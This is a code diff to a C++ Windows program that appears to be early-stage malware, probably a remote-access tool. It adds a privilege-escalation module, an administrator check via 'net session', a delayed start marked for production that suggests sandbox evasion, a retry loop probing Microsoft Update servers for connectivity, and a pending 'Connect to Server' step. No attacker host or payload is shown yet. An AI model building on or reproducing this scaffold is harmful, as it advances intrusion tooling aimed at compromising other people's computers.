@@ -1,8 +1,11 @@
 #include <iostream>
 #include <time.h>
 
+#include "MicrosoftUpdate.h"
 #include "System.h"
 #include "PrivilegeEscalation.h"
+
+#pragma comment(lib, "Ws2_32.lib")
 
 
 int main(int argc, char** argv)
@@ -24,14 +27,26 @@ int main(int argc, char** argv)
 		}
 	}
 
-	std::cout << "Continue with low privileges" << std::endl; // LOG
+	ShowWindow(hWnd, SW_SHOW);
+	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());
+	if (System::getIsSystemAdmin())
+	{
+		system("net session");
+		std::cout << "Running as an Administrator!" << std::endl;
+	}
 
-	// TODO: Maintaining
+	// TODO: Maintaining (next sprint)
 
+connection:
+	std::cout << "LOG: waiting..." << std::endl;
 	// Wait 3 Minutes for Security Reasons
 	//Sleep(180000); -> REMOVE COMMENT BEFORE PRODUCTION
 
-	//TODO: Connect to Microsoft Update Servers
+	//Connect to Microsoft Update Servers for Internet Check
+	if (!MicrosoftUpdate::run())
+	{
+		goto connection;
+	}
 
 	//TODO: Connect to Server
 
